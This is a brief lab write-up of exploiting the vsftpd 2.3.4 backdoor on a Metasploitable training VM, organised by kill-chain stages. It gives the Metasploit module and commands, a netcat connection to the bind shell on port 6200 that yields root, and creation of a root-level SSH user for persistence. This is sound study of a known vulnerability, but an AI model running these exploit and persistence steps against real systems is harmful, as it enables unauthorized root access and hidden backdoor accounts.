# Exploiting `vsftpd`

--- 

## Metasploit Method

### Reconnaissance
- Netdiscover to identify IP Address of Metasploitable (Target) VM 
- A bash script running nmap scans to identify: 
    - Open Ports 
    - Services 
    - Versions 
    - Operating System

- Identified Port 21 is open and running vsftpd 2.3.4 which is vulnerable to Backdoor Command Execution 

### Weaponization
- Used Metasploit Framework to automate the exploit 
- The exploit used is vsfptd_234_backdoor 
- Metaploit path is `exploit/unix/ftp/vsftpd_234_backdoor`

```bash 
msfconsole 
search vsftpd 
use 1 
set RHOSTS 192.168.56.105
```

### Delivery

- Ran the exploit 

```bash 
run 
```

### Exploitation 

- The exploit opens listening port 6200 on the Target VM
- On another terminal used netcat to connect to port 6200 
- nc 192.168.56.105 6200
- A terminal with root privileges was achieved 

### Installation 
- Created a new user with root-level SSH 

### Command And Control 
- The listening port on 6200 acts as a C2C channel
- When connected via SSH this becomes the new C2C channel

### Actions On Objectives 

- Exploitation was achieved 
- An SSH user was created 